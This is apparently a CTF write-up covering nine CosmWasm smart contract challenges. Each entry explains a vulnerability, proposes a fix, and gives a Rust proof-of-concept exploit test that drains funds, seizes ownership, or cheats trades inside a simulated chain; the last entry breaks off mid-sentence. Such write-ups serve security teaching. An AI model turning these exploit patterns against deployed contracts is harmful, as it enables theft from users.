# Solutions to the CTF

## Challenge 01: *Mjolnir*

### Description

Hello guys my name is Jess I am a security researcher mostly in the area of Windows binary exploitation.
I think the issue in this challenge, is that in the withdraw() function in contract.rs, on L#94, you can
claim multiple times for the same ID. You could fix this by keeping a list of unlocked lockup ids, and
return Err if this list contains the lockup.id

(I think there are also some fancy slice tricks which you could use to deduplicate vec entries without
adding an extra mem allocation, but don't think is stabilized yet, just in nightly; also this way makes
the developer's intention clear)

Incidentally this is kind of reminescent of the Mirror exploit from the halcyon days of 2021 :)
  
### Recommendation

error.rs:
```rust
#[derive(Error, Debug)]
pub enum ContractError {
    #[error("{0}")]
    Std(#[from] StdError),

    #[error("Unauthorized")]
    Unauthorized {},

    #[error("Duplicate Position")]
    DuplicatePosition {},
}
```

contract.rs:
```rust
    let mut unlocked_ids: Vec<Uint128> = vec![];
    for lockup in lockups {
        // validate owner and time
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized {});
        }

        // validate position lockup
        if unlocked_ids.contains(lockup.id) {
            return Err(ContractError::DuplicatePosition {});
        }
        // push lockup id
        unlocked_ids.push(lockup.id);

        // increase total amount
        total_amount += lockup.amount;

        // remove from storage
        LOCKUPS.remove(deps.storage, lockup.id);
    }
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        // claim for the same id repeatedly
        let msg = ExecuteMsg::Withdraw { ids: vec![1,1,1,1,1,1,1,1,1,1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        // contract was funded with 10 deposit_amount
        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10));
    }
```

---

## Challenge 02: *Gungnir*

### Description

One mistake people make surprisingly often is to assume that Rust guards against integer underflow/overflow.
The result of an arithmetic operation in Rust *can not be undefined* due to its strict type semantics.
So the compiler will perform static checks, but can't assume the result of addition or subtraction at runtime.
Any additional runtime checks which rustc would add incur additional overhead, so they must be made explicit
in Cargo.toml if you want to advantage of them. This is an understandable oversight especially for developers
coming from the world of Solidity smart contracts (where type safety and optimization are sometimes not a priority).


I observe first of all that this is the release profile in Cargo.toml (note the last setting particularly)
[this is the default for release profile, as well](https://doc.rust-lang.org/cargo/reference/profiles.html)
```
[profile.release]
opt-level = 3
debug = false
rpath = false
lto = true
debug-assertions = false
codegen-units = 1
panic = 'abort'
incremental = false
overflow-checks = false
```

And next I see that unstake does not check the unlock_amount (which is arbitrary user input) against the
user.total_tokens:
```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
```

Thus you can violate the program invariant that stake < total tokens, which is assumed here on L#105:
    // cannot stake more than total tokens
We can fix this by adding additional sanity checks! Or we can use checked_sub instead of -=. Or both!

[Here](https://www.sec3.dev/blog/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts) is a blog from the fine folks at sec3 about the issue. It mostly concerns solana programs, but the
same idea applies here for cosmwasm!


### Recommendation

```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    // cannot UNstake more than total tokens
    if unlock_amount > user.total_tokens.u128() {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power = user.voting_power.checked_sub(unlock_amount);

    VOTING_POWER
        .save(deps.storage, &info.sender, &user)
        .unwrap();

    Ok(Response::new()
        .add_attribute("action", "unstake")
        .add_attribute("unlock_amount", unlock_amount.to_string())
        .add_attribute("user.voting_power", user.voting_power.to_string()))
}
```
And maybe change the release profile to be overflow-checks = true if we don't mind the overhead

### Proof of concept
Tests can give people a false sense of confidence. If your test does not reflect the release environment,
its results may not catch bugs which surface in production

If we run this with cargo's default test profile (ie with debug assertions enabled and optimizations disabled),
it will fail. However, if we run it with cargo test --release then it will pass:

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // evil unstake
        let msg = ExecuteMsg::Unstake {
            // -1 should give us u128::MAX voting_power
            unlock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // hella voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, u128::MAX);
    }
```

---

## Challenge 03: *Laevateinn*

### Description

Issue:
I am not such the cosmwasm expert. I have more experience with the cosmos go sdk, (and substrate as far as rust stuff goes).
So I had to RTFM a little about how contract state is handled in cosmwasm, because I saw that addresses are being deserialized from
the Addr type rather than an Option<String>, *even though the attacker can pass an arbitrary input*. This seemed potentially unsafe to me.
Sure enough, I came across [this info](https://book.cosmwasm.com/basics/state.html)

"First, we need to transform the vector of strings into the vector of addresses to be stored.
We cannot take addresses as a message argument because not every string is a valid address.

Every string can be technically considered an address. However, not every string is an actual existing blockchain address.
When we keep anything of type Addr in the contract, we assume it is a proper address in the blockchain.
That is why the addr_validate function exits - to check this precondition."

addr_validate is not used, and Addr is consumed as an argument.
I observed this in contract.rs of the proxy contract; this is the function that users call to request a flash loan:
```rust
/// Entry point for user to request flash loan
pub fn request_flash_loan(
    deps: DepsMut,
    env: Env,
    _info: MessageInfo,
    recipient: Addr,
    msg: Binary,
)
```

Indeed recipient is passed in as an Addr, but it's not validated to be an address! There is only some cursory sanity checking done to
(attempt to) check that the "recipient" parameter is not the flash loan contract:
```rust
    // Disallow calling flash loan addr
    if recipient == config.flash_loan_addr {
        return Err(ContractError::CallToFlashLoan {});
    }
```
However, it's only checking that these two strings are equivalent! I recalled as well that cosmos addresses *are not case sensitive*.
Cosmos use Bech32. So the simplest way to bypass this minimal check is by simply using an uppercase string.

Secondly, I observed that the attacker also has control of the msg parameter. This is used to execute a msg of the "recipient" in the context of
the proxy contract, in ctf-03/contracts/proxy/src/contract.rs in request_flash_loan():
```rust
    msgs.push(CosmosMsg::Wasm(WasmMsg::Execute {
        contract_addr: recipient.to_string(),
        msg,
        funds: vec![flash_loan_balance],
    }));
```

So we can execute an arbitrary message of an arbitrary contract, yes including the flash loan contract. So we just change its ownership to
be the "mock_arb" contract (unpriv user) and then call the withdraw_funds to drain the funds (ie capture the flag :P)

### Recommendation

The proxy contract and all other contracts should use an Option<String> as a function argument, instead of passing Addr directly.
And then the type should be validated in the function with something like:
let recipientaddr = msg.addr.map(|recipient| deps.api.addr_validate(&recipient)).transpose()?;

Additionally, for improved safety, I think that request_flash_loan() should not permit users to pass in an arbitrary message. Instead,
you could have a standard interface that all flashloan receivers are expected to implement (just thinking of how Balancer or Aave does it)

Also, it would probably be safer if the flashloan receiver were also the info.sender, although this limits composability.

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
            proper_instantiate();

        // prepare transfer ownership message
        let pwn_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: Addr::unchecked(CONTRACT2),
        })
        .unwrap();

        // evade the minimal sanity checking in proxy.rs
        // (cosmos addresses aren't case-sensitive)
        let wat: &str = r#"CONTRACT0"#;

        // direct control flow to flashloan contract instead of arb contract
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract,
            &ExecuteMsg::RequestFlashLoan {
                recipient: Addr::unchecked(wat),
                msg: pwn_msg,
            },
            &[],
        )
        .unwrap();

        // drain funds
        app.execute_contract(
            Addr::unchecked(CONTRACT2),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds {
                recipient: Addr::unchecked(CONTRACT2),
            },
            &[],
        )
        .unwrap();

        // funds are drained, flash contract rekt
        let balance = app
            .wrap()
            .query_balance(CONTRACT2, DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }
```

---

## Challenge 04: *Gram*

### Description

The issue with this code is that the shares calculation can be inflated by an attacker, by donating directly
to the contract. This is an issue known to affect EIP 4626 vaults, in solidity-land, but it can apply to
many vault implementations.
[Good blog](https://tienshaoku.medium.com/eip-4626-inflation-sandwich-attack-deep-dive-and-how-to-solve-it-9e3e320cc3f1)

We can look at how the shares are calculated to see why, in mint() under src/contract.rs L58:
```rust
    let total_assets = contract_balance.amount;
    let total_supply = config.total_supply;

    // share = asset * total supply / total assets
    let mint_amount = if total_supply.is_zero() {
        amount
    } else {
        amount.multiply_ratio(total_supply, total_assets)
    };
```

On the very first deposit to the contract, if an attacker just deposits 1 wei, they are minted one share.
total_supply is the total number of shares issued, while total_assets represents the balance of the contract:
```rust
    let total_assets = contract_balance.amount - amount;
```

We don't have to call mint() to increase the balance of this contract! We can simply transfer ("donate")
to it directly! So if we donate 1e18 wei, our initial 1 share is now worth 1e18 + 1 wei, and the exchange
value of the share increases with each additional deposit to the contract.

So what happens now if the next mintooor tries to deposit less than the contract balance?

Well [per the docs for multiply_ratio](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Uint128.html#method.multiply_ratio)
"Due to the nature of the integer division involved, the result is always floored. E.g. 5 * 99/100 = 4."

So the mint_amount will round down to 0, which will lead the execution to revert, under mint() in contract.rs:
```rust
    if mint_amount.is_zero() {
        return Err(ContractError::ZeroAmountNotAllowed {});
    }
```

This will potentially cause some frustration for users. But the situation gets worse, because the attacker
will be able to withdraw more than they deposited (ie, since the exchange rate of 1 share is so high, and
the mint_amount calculation rounds down).
```rust
    let asset_to_return = shares.multiply_ratio(total_assets, total_supply);
```

Here's some napkin math:

1) empty vault...

2) mint shares for 1 asset = 1 share

3) donate 1000, exchange rate now (shares = asset * 1 / 1001)

4) next user mints shares for 2000 assets, shares = 2000 * 1 / 1001 = 1 share

5) total_supply is now 2, total assets is 3001

6) exchange rate is now (shares = asset * 2 / 3001) or (asset = shares * 3001 / 2)

7) now we burn the share, at the expense of the last user

8) our initial one share is now worth 1500. we deposited 1 and donated 1000, so our profit is (1500 - 1000 + 1) = 499

-the profit scales up for each additional deposit

-other users' shares are worth less with each attacker burn

-additionally if, for eg, a lending protocol allows cross-collateral lending and the shares are debt tokens,
all kinds of rektage can occur against the protocol as we have seen too many times now in the space

### Recommendation

Mitigating measures could take several forms depending on the context in which this vault is being used. Here are some suggestions:

-deposit a dust amount on vault creation to make the attack un-economical

-disallow smol deposits less than a certain amount

-enforce a minimum lockup time to prevent first depositor from sandwiching other users

-track the total asset deposits for minting as a variable in contract state, separately from the total contract balance
  -if there is some mismatch, the excess shares could be skimmed to another contract for retrieval

-rounding up instead of down would make this attack unprofitable (or rather, the difference would accrue to protocol instead of attacker),
but donation would have other undesirable behaviors, if someone felt like griefing them

maybe like?:
```rust
    let ratio = (u128(total_supply), u128(total_assets));
    let mint_amount = if total_supply.is_zero() {
        amount
    } else {
        amount.check_mul_ceil(ratio).unwrap()
    };
```
-think carefully about the implications of integrating these shares into any lending protocol

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1, DENOM)],
        )
        .unwrap();

        // donate funds to contract
        app.send_tokens(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &[coin(5_000, DENOM)],
        )
        .unwrap();

        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // query user
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();

        // burn shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // user 1 profits off donation/sandwich
        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert!(bal.amount > Uint128::new(10_000));

        // user 2 has a loss
        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert!(bal.amount < Uint128::new(10_000));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }
```

---

## Challenge 05: *Draupnir*

### Description

I noticed first of all, that all privileged methods have a precondition, assert_owner(deps.storage, info.sender)?;
Here is what it does, in state.rs:
```rust
pub fn assert_owner(store: &dyn Storage, sender: Addr) -> Result<(), ContractError> {
    let state = STATE.load(store)?;

    if state.current_owner != sender {
        return Err(ContractError::Unauthorized {});
    }
    Ok(())
}
```

There is another function, accept_owner(), that allows a proposed new owner to accept their role. It does not have
assert_owner(). In its intial state, the proposed_owner is None. propose_owner() must be called to propose a new
owner. accept_owner() updates the current owner, after this block:
```rust
    if state.proposed_owner != Some(info.sender.clone()) {
        ContractError::Unauthorized {};
    }
```

Cosmwasm conceives of contracts as "agents" that communicate through serializable messages, using them both to initiate
execution and consume results. It would be encouraged to send an error message in the event that contract state fails
to [update](https://book.cosmwasm.com/actor-model/contract-as-actor.html#messages)

Our ContractError here is just a simple enum. We have to decide when to return it, or what to do with it.
Rather than being able to just throw the err. [Error handling](https://book.cosmwasm.com/basics/execute.html#error-handling)

If we look again you can see that the error is not returned! This statement will just evaluate to true because the
enum exists. Execution continues, state is updated, and the other "agents" are also unaware that anything could've
gone wrong.

### Recommendation

Actually return the error, in propose_owner() in src/contract.rs
```rust
    if state.proposed_owner != Some(info.sender.clone()) {
        return ContractError::Unauthorized {};
    }
```

Better yet, add this to state.rs:
```rust
pub fn assert_newowner(store: &dyn Storage, sender: Addr) -> Result<(), ContractError> {
    let state = STATE.load(store)?;

    if state.proposed_owner != sender {
        return Err(ContractError::Unauthorized {});
    }
    Ok(())
}
```

Now we can both assert the error and return it:
```rust
/// Entry point for new owner to accept a pending ownership transfer
pub fn accept_owner(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
    assert_newowner(deps.storage, info.sender)?;

    STATE.update(deps.storage, |mut state| -> StdResult<_> {
        state.current_owner = info.sender.clone();
        state.proposed_owner = None;
        Ok(state)
    })?;

    Ok(Response::new()
        .add_attribute("action", "accept_owner")
        .add_attribute("new owner", info.sender))
}
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // Initial state
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked(ADMIN),
                proposed_owner: None,
            }
        );

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(8_000, DENOM)],
        )
        .unwrap();

        // change owner arbitrarily
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        let pwn_msg = cosmwasm_std::BankMsg::Send{
            to_address: USER1.to_string(),
            amount: vec![coin(Uint128::new(18_000).u128(), DENOM)],
        };

        // drain funds
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction {
                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
            },
            &[],
        )
        .unwrap();

        // Query balances
        // we should have been able to take the contract total deposits
        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(18_000));

        // Final state
        // we should be new owner
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked(USER1),
                proposed_owner: None,
            }
        );
    }
```

---

## Challenge 06: *Hofund*

### Description

The receive_cw20() for cw20 tokens, under src/contract.rs will allow users to still deposit tokens
after the end of the voting window, or from any address and not just voting_token address.
Basically the solidity equivalent would be a payable fallback that always returns true and doesn't revert.
So if some user submits a proposal and it fails, they can still deposit after the end of the voting period but
before resolve_proposal() has been called, then call it to execute the proposal.

Also the contract doesn't seem to refund users if a proposal fails, so their stake can be reused for another proposal.
I think either this should be changed, or, if the intention is to allow voting on a *single* proposal, then there
should be no ability to propose a new one after the first fails (if that makes sense).

### Recommendation

Change the receive function:
```rust
pub fn receive_cw20(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    cw20_msg: Cw20ReceiveMsg,
) -> Result<Response, ContractError> {
    let config = CONFIG.load(deps.storage)?;
    let current_proposal = PROPOSAL.load(deps.storage)?;

    match from_binary(&cw20_msg.msg) {
        Ok(Cw20HookMsg::CastVote {}) => {
            if config.voting_token != info.sender {
                return Err(ContractError::Unauthorized {});
            }

            if current_proposal
                .timestamp
                .plus_seconds(config.voting_window)
                < env.block.time
            {
                return Err(ContractError::VotingWindowClosed {});
            }

            Ok(Response::default()
                .add_attribute("action", "Vote casting")
                .add_attribute("voter", cw20_msg.sender)
                .add_attribute("power", cw20_msg.amount))
        }
        _ => Err(ContractError::Unauthorized {}),
    }
}
```

And also have a way to refund users after a proposal has ended, so their funds can't be used in the next proposal

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes, simulates msg from CW20 contract
        // not enough to reach consensus
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(50_001),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // deposit additional funds after voting window has closed
        let send_msg = Binary::from(r#"{"some":123}"#.as_bytes());
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg: send_msg,
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER1.to_string());
    }
```

---

## Challenge 07: *Tyrfing*

### Description

As described [here](https://book.cosmwasm.com/basics/state.html), the storage items are just aliases for keys in the blockchain's key:value store:

If you look in src/state.rs, you can see that OWNER is the first variable declared in contract storage:
```rust
pub const OWNER: Item<Addr> = Item::new("address");

pub const THRESHOLD: Item<Uint128> = Item::new("config");

pub const BALANCES: Map<&Addr, Uint128> = Map::new("user_balances");
```

We see that TOP_DEPOSITOR is instantiated here in contract.rs:
```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("address");
```

But OWNER is also named "address" causing a name collision.
So the assignment of TOP_DEPOSITOR is not a new storage variable, but just an alias for owner!
When TOP_DEPOSITOR is updated here in deposit() in src/contract.rs, the owner is reassigned:
```rust
    if user_balance > current_threshold {
        THRESHOLD.save(deps.storage, &user_balance)?;
        TOP_DEPOSITOR.save(deps.storage, &info.sender)?;
    }
```
giving this user admin privileges. so if you become the biggest depositor, you can steal the other
users' funds

### Recommendation

Fix it so TOP_DEPOSITOR references a difference storage key from OWNER:
```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("top_depositor");
```
Also keep them in one file (state.rs) to avoid any confusion or oversight

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        app = mint_tokens(app, USER2.to_string(), Uint128::from(11_000u128));
        app = mint_tokens(app, USER1.to_string(), Uint128::from(10_000u128));

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(11_000, DENOM)],
        )
        .unwrap();

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked(USER2));

        // we shouldn't be authorized to do this
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::UpdateConfig {
                new_threshold: Uint128::new(20_000),
            },
            &[],
        )
        .unwrap();

        let pwn_msg = cosmwasm_std::BankMsg::Send{
            to_address: USER2.to_string(),
            amount: vec![coin(Uint128::new(21_000).u128(), DENOM)],
        };

        // or this
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction {
                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(21_000));
    }
```

---

## Challenge 08: *Gjallarhorn*

### Description

exec_accept_trade() in src/contract.rs is called by a user who put up an NFT for sale/exchange, when they want to accept a user's
offer of a trade for another NFT. The transfer is facilitated by submessages:
```rust
    // Asked
    let mut submsgs = vec![SubMsg::reply_always(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: trade.trader.to_string(),
                token_id: trade.asked_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    )];

    // Offered
    submsgs.push(SubMsg::reply_always(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: sale.owner.to_string(),
                token_id: trade.to_trade_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    ));
```

A user extends an offer for a trade via exec_new_trade(), which does check that the exchange contract has been
granted approval by the offerer before committing the offer to storage:
```rust
    // ensure contract have approval
    let _: ApprovalResponse = deps
        .querier
        .query_wasm_smart(
            config.nft_contract.to_string(),
            &Cw721QueryMsg::Approval {
                token_id: offered_id.clone(),
                spender: env.contract.address.to_string(),
                include_expired: None,
            },
        )
        .unwrap();
```
exec_accept_trade() does not perform this same check before initiating a transfer; it only checks if the sale owner is
the caller:
```rust
    if sale.owner != info.sender {
        return Err(ContractError::Unauthorized {});
    }
```
Also, its use of reply_always leads to a situation where exec_accept_trade() can succeed even if an error occurs in the transfer,
ie the error does not "bubble up." [Here](https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md) is some relevant info about submessages

Especially relevant:
"Note, that error doesn't abort the whole transaction if and only if the reply is called - so in case of ReplyOn::Always and ReplyOn::Error. If the submessage is called with ReplyOn::Success (or ReplyOn::Never, which makes it effectively a normal message), the error in subsequent call would result in failing whole transaction and not commit the changes for it. The rule here is as follows: if for any reason you want your message handling to succeed on submessage failure, you always have to reply on failure."

### Recommendation

change exec_accept_trade() so it doesn't use reply_always:
```rust
    // Asked
    let mut submsgs = vec![SubMsg::reply_on_success(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: trade.trader.to_string(),
                token_id: trade.asked_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    )];

    // Offered
    submsgs.push(SubMsg::reply_on_success(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: sale.owner.to_string(),
                token_id: trade.to_trade_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    ));
```
And also check that approval is still granted to the exchange contract, at the beginning of exec_accept_trade(),
before the transfer logic.

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new tradable sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(150u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        // Create trade offer
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT2.to_string(),
            },
            &[],
        )
        .unwrap();

        // immediately revoke approval to exchange contract
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
            },
            &[],
        )
        .unwrap();

        // USER1 accepts trade
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: USER2.to_string(),
            },
            &[],
        )
        .unwrap();

        // we receive NFT1 as expected
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());

        // but we still own NFT2 as well!
        // they accepted our trade offer but never received it
        // rugged
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());
    }
```

---

## Challenge 09: *Brisingamen*

### Description

Actually, I think I completely missed that the token addresss is also not checked. This one and 6 I didn't quite understand the scenario.


update_rewards() in contract.rs doesn't actually update the user_index in some cases!
```rust
    // no need update amount if zero
    if user.staked_amount.is_zero() {
        return;
    }
```
If you don't update the user_index, a user can just keep making their rewards share
increase monotonically by withdrawing their full amount before an increase_reward()
and depositing it again after.

You can see here in deposit() in contract.rs that the staked_amount and total_staked are increased:
```rust
    // update rewards
    update_rewards(&mut user, &state);

    // increase user amount
    user.staked_amount += amount;

    // increase total staked amount
    state.total_staked += amount;
```
If the user's staked_amount has decreased to 0, then deposit() will use the old index.
Just simply sandwich an increase_reward() call, by withdrawing all your funds before, then depositing
